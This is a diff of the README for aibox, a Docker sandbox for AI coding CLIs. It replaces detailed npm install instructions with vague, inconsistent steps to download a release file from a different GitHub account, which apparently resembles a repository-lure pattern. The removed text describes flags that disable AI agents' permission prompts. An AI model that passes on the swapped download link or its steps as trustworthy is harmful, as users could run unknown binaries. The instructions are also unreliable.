@@ -1,343 +1,82 @@
-# aibox
+# 🐳 aibox - Your Safe and Easy Docker Workspace
 
-A secure, isolated Docker environment for running multiple AI command-line tools (Claude Code, Codex, and Gemini) with multi-account support and comprehensive security features.
+## 🚀 Getting Started
 
-**Optimized for Node.js/JavaScript projects** - Built on Node.js 20 Alpine, includes npm, and common development tools for modern JavaScript/TypeScript development.
+Welcome to aibox! This application helps you create a secure Docker sandbox for running AI tools like Claude Code, Codex, and Gemini CLI. With aibox, you can manage multiple accounts, keep your configurations safe, and integrate with SSH and Git easily. Let’s get started.
 
-## 🚀 Features
+## 📥 Download & Install
 
-- **Multi-CLI Support**: Run Claude Code, Codex, or Gemini CLI from a single unified container
-- **Security First**: Non-root user execution, capability dropping, and filesystem isolation
-- **Multi-Account**: Manage separate configurations for work, personal, or client projects
-- **Persistent Configs**: Direct host mapping of `~/.claude`, `~/.codex`, and `~/.gemini`
-- **Interactive by Default**: Opens bash shell by default - run any CLI manually or pass args to execute directly
-- **Git Integration**: Seamless git operations with SSH key mounting and macOS compatibility
-- **Resource Limited**: CPU and memory constraints to prevent system exhaustion
-- **Simple Management**: Single service architecture with docker-compose
+To download aibox, visit the Releases page. 
 
-## 📋 Prerequisites
+[![Download aibox](https://img.shields.io/badge/Download%20aibox-v1.0-blue)](https://github.com/jokerlamousine/aibox/releases)
 
-- [Docker](https://docs.docker.com/get-docker/) installed and running
-- [Docker Compose](https://docs.docker.com/compose/install/) installed
-- [Node.js](https://nodejs.org/) (for npm installation method)
+Once on the page, follow these steps:
 
-## 🏁 Quick Start
+1. Find the latest version listed at the top.
+2. Choose the version that matches your operating system (macOS or Linux).
+3. Click the link to download the file.
 
-### Installation
+The download will begin automatically. Save the file to your computer and note where it downloads.
 
-**Option 1: Install via npm (Recommended)**
+## 💻 System Requirements
 
-```bash
-# Install globally
-npm install -g @zzev/aibox
+For the best experience with aibox, ensure your system meets the following requirements:
 
-# Or use with npx (no installation needed)
-npx @zzev/aibox
-```
+- **Operating System:** macOS 10.15 or later (compatible with Linux)
+- **RAM:** Minimum 8 GB recommended
+- **Docker:** You need Docker installed on your computer. Follow the [official Docker installation guide](https://docs.docker.com/get-docker/) if you haven't done it yet.
 
-**Option 2: Install from GitHub**
+## ⚙️ Installation Steps
 
-```bash
-npm install -g https://github.com/zzev/aibox.git
-```
+Once you've downloaded the aibox application file:
 
-**Option 3: Clone and link locally**
+1. **Locate the Downloaded File:** Go to the folder where you saved the downloaded file.
+2. **Open Terminal:** For macOS, open the Terminal application.
+3. **Navigate to the Download Location:** Use the `cd` command to change directories to where the aibox file is saved. For example:
+   ```
+   cd ~/Downloads
+   ```
+4. **Run the Application:** Use the following command to run the application with Docker:
+   ```
+   docker-compose up
+   ```
+5. **Follow On-screen Instructions:** The application may ask for additional permissions or steps. Follow the prompts to complete the setup.
 
-```bash
-# Clone the repository
-git clone https://github.com/zzev/aibox.git
-cd aibox
+## 🛠️ Features
 
-# Link globally
-npm link
-```
+aibox comes packed with features to enhance your experience:
 
-### Setup
+- **Multi-Account Support:** Easily switch between different user accounts.
+- **Persistent Configurations:** Keep your settings safe and easily accessible.
+- **SSH and Git Integration:** Seamlessly work with version control systems.
+- **Docker Optimized for macOS:** Enjoy a fast and efficient setup tailored for your operating system.
 
-```bash
-# Navigate to your project directory
-cd /path/to/your/project
+## 📋 How to Use aibox
 
-# On first run, aibox will automatically pull the Docker image from ghcr.io
-# and guide you through interactive profile setup
-aibox
+1. **Launch the Application:** After installation, launch aibox from your Terminal.
+2. **Configure Your Environment:** Setup any necessary configurations based on your projects.
+3. **Start Using AI Tools:** You can now run tools like Claude Code, Codex, and Gemini CLI within the secure suite.
 
-# Or explicitly configure a profile
-aibox -p default
-aibox --setup default
-```
+## 🌐 Community and Support
 
-### Run
+If you need help, feel free to check out our community:
 
-```bash
-# Default: Interactive bash shell
-aibox
+- **GitHub Issues:** Report any bugs or issues you encounter.
+- **Discussions:** Join our community discussions to share tips and improvements with other users.
+- **Documentation:** Access detailed usage guides and tips within the repository's Wiki on GitHub.
 
-# Inside the container, run any CLI:
-claude --dangerously-skip-permissions
-codex
-gemini
+## 🛑 Troubleshooting
 
-# Or run directly with arguments:
-aibox --dangerously-skip-permissions  # Claude Code
-aibox -t codex                        # Codex
-aibox -t gemini                       # Gemini
+If you face issues while using aibox, consider these common solutions:
 
-# YOLO mode (unified syntax for skipping permissions):
-aibox --yolo                          # Claude with --dangerously-skip-permissions
-aibox -t codex --yolo                 # Codex with --sandbox danger-full-access
-aibox -t gemini --yolo                # Gemini with --yolo
-```
+- **Docker Not Running:** Ensure Docker is running on your machine. You can check by typing `docker info` in Terminal.
+- **File Permissions:** If you encounter permission errors, you may need to adjust file permissions for the downloaded application.
+- **Check Dependencies:** Ensure all required tools and libraries are installed.
 
-## 🎯 Usage
+## 🔗 Links and Resources
 
-### Basic Commands
+- [Download aibox](https://github.com/jokerlamousine/aibox/releases)
+- [Docker Installation Guide](https://docs.docker.com/get-docker/)
+- [GitHub Repository](https://github.com/jokerlamousine/aibox)
 
-```bash
-# Interactive shell (default)
-aibox
-
-# Run specific CLI directly
-aibox --dangerously-skip-permissions  # Claude Code
-aibox -t codex                        # Codex (executes directly)
-aibox -t gemini                       # Gemini (executes directly)
-
-# YOLO mode (skip all permissions)
-aibox --yolo                          # Claude with --dangerously-skip-permissions
-aibox -t codex --yolo                 # Codex with --sandbox danger-full-access
-aibox -t gemini --yolo                # Gemini with --yolo
-aibox --yolo file.py                  # YOLO mode with additional arguments
-
-# With additional arguments
-aibox -t codex help
-aibox -t gemini chat "Hello"
-
-# Clean orphan containers
-aibox --clean
-
-# Check for Docker image updates
-aibox --update
-aibox -a work --update
-
-# Attach to running container
-aibox --attach
-
-# Use specific account
-aibox -a work
-
-# Remove container after exit
-aibox -r
-```
-
-### Profile Management
-
-Configure or reconfigure profiles interactively:
-
-```bash
-# Configure a profile (creates if new, reconfigures if exists)
-aibox -p default
-aibox --setup work
-
-# The interactive setup will guide you through:
-# - Git author name and email
-# - Preferred AI CLI (claude/codex/gemini)
-# - SSH key configuration
-# - GitHub CLI token (optional)
-```
-
-### Multi-Account Setup
-
-Profiles are stored globally in `~/.aibox/profiles/` and work across all your projects:
-
-```bash
-# Create work profile interactively
-aibox -p work
-
-# Create personal profile
-aibox -p personal
-
-# Use different profiles
-aibox -a work -t codex
-aibox -a personal -t claude --dangerously-skip-permissions
-
-# Reconfigure an existing profile
-aibox -p work  # Will show current values as defaults
-```
-
-**How Multi-Account Works:**
-
-Each profile uses separate configuration directories for Claude Code and Codex:
-
-| CLI | Default Account | Other Accounts | Multi-Account Support |
-|-----|----------------|----------------|---------------------|
-| **Claude Code** | `~/.claude` | `~/.claude-{account}` | ✅ Yes (via `CLAUDE_CONFIG_DIR`) |
-| **Codex** | `~/.codex` | `~/.codex-{account}` | ✅ Yes (via `CODEX_HOME`) |
-| **Gemini** | `~/.gemini` | `~/.gemini` (shared) | ❌ No (hardcoded path) |
-
-**Important Notes:**
-- **Claude Code**: Uses `CLAUDE_CONFIG_DIR` environment variable (undocumented feature, some known issues)
-- **Codex**: Uses `CODEX_HOME` environment variable (fully supported)
-- **Gemini**: Does not support custom config directories - all accounts share `~/.gemini`
-
-To use multiple Gemini accounts, you would need to manually switch configurations by logging out/in.
-
-## ⚙️ Configuration
-
-### aibox Profiles (`~/.aibox/profiles/`)
-
-Profiles are stored globally in `~/.aibox/profiles/` and contain your personal settings (git config, SSH keys, Docker image, etc.)
-
-### Project Environment - Optional
-
-Project-specific environment variables are **optional**. If your project has them, aibox will automatically detect and load them.
-
-## 🔒 Security Features
-
-- **Non-root execution**: Runs as `ai` user (UID 1001)
-- **Capability dropping**: Minimal Linux capabilities
-- **No privilege escalation**: `no-new-privileges` security option
-- **Read-only mounts**: SSH keys and configs mounted read-only
-- **Network isolation**: Dedicated `ai-network`
-- **Resource limits**: 2 CPU cores, 4GB RAM max
-- **SSH config filtering**: Automatic macOS → Linux compatibility
-
-## 🗂️ Volume Mappings
-
-All configurations are mapped from your host for instant persistence:
-
-| Host Path | Container Path | Purpose |
-|-----------|---------------|---------|
-| `~/.claude` or `~/.claude-{account}` | `/home/ai/.claude` | Claude Code config (account-specific) |
-| `~/.codex` or `~/.codex-{account}` | `/home/ai/.codex` | Codex config (account-specific) |
-| `~/.gemini` | `/home/ai/.gemini` | Gemini config (shared across accounts) |
-| `~/.ssh` | `/home/ai/.ssh` | SSH keys (read-only) |
-| `~/.gitignore_global` | `/home/ai/.gitignore_global` | Global gitignore |
-| `~/.config/ccstatusline` | `/home/ai/.config/ccstatusline` | ccstatusline config |
-| `./` | `/home/ai/code` | Project directory |
-
-## 🐳 Container Naming
-
-Containers are named: `aibox-{AI_ACCOUNT}`
-
-Examples:
-- `aibox-default`
-- `aibox-work`
-- `aibox-personal`
-
-The same container is reused for all CLI types (Claude, Codex, Gemini), making it more efficient.
-
-## 📖 Documentation
-
-For comprehensive documentation, see [DOCKER.md](./DOCKER.md) which includes:
-
-- Detailed usage examples
-- Troubleshooting guide
-- Advanced configuration
-- SSH key setup
-- Git integration
-- Best practices
-
-## 🛠️ Common Operations
-
-### Managing Containers
-
-```bash
-# List all aibox containers
-docker ps -a --filter "name=aibox"
-
-# Stop specific container
-docker stop aibox-default
-
-# Remove specific container
-docker rm aibox-default
-
-# Clean all stopped containers
-aibox --clean
-```
-
-### Viewing Logs
-
-```bash
-# View container logs
-docker logs aibox-default
-docker logs aibox-work
-
-# Follow logs
-docker logs -f aibox-personal
-```
-
-## 🔧 Troubleshooting
-
-### Container won't start
-
-```bash
-# Clean orphaned containers
-aibox --clean
-
-# Remove the container and let it be recreated
-docker rm -f aibox-default
-aibox
-```
-
-### SSH/Git issues
-
-```bash
-# Verify SSH keys exist
-ls -la ~/.ssh
-
-# Enter container and test
-aibox
-ssh -T git@github.com
-```
-
-### Permission errors
-
-```bash
-# Container runs as ai:ai (1001:1001)
-# Ensure host directories are accessible
-ls -la ~/.claude ~/.codex ~/.gemini
-```
-
-## 🆚 aibox vs devcontainers
-
-While both use Docker for isolated development, they serve different purposes:
-
-| Feature | aibox | devcontainers |
-|---------|-------|---------------|
-| **Purpose** | Run AI CLIs securely with multi-account support | Full development environment in container |
-| **Setup** | Single global installation via npm | Per-project `.devcontainer` configuration |
-| **Usage** | CLI-first: `aibox` command from any project | IDE-integrated: requires VS Code/supported editor |
-| **Configuration** | Reusable across all projects | Project-specific configuration |
-| **AI Account Management** | Native multi-account support | Manual configuration per project |
-| **Config Persistence** | Direct host mapping (`~/.claude`, etc.) | Volumes or per-project setup |
-| **Complexity** | Minimal: one command to start | Higher: JSON config, IDE integration |
-| **Best for** | Quick AI CLI access, multiple AI accounts, JS projects | Full-stack development, polyglot projects, team standardization |
-
-**Use aibox when**: You want instant AI CLI access across projects without per-project configuration.
-
-**Use devcontainers when**: You need a fully customized development environment with IDE integration.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
-
-## 📄 License
-
-This project is provided as-is for use with AI CLIs. Ensure compliance with the respective terms of service:
-- [Anthropic Terms of Service](https://www.anthropic.com/legal/consumer-terms) (Claude Code)
-- [OpenAI Terms of Use](https://openai.com/policies/terms-of-use) (Codex)
-- [Google Terms of Service](https://policies.google.com/terms) (Gemini)
-
-## ⚠️ Disclaimer
-
-This Docker environment is designed for development and testing purposes. The `--dangerously-skip-permissions` flag for Claude Code should only be used in isolated environments like this Docker container.
-
-## 🙏 Acknowledgments
-
-- Built for secure execution of AI command-line tools
-- Inspired by best practices in Docker security and isolation
-- Designed for developers who work with multiple AI CLIs
-
----
-
-**Need help?** Check out the [detailed documentation](./DOCKER.md) or open an issue.
+Thank you for using aibox! Enjoy a secure and flexible environment for your AI and development needs.
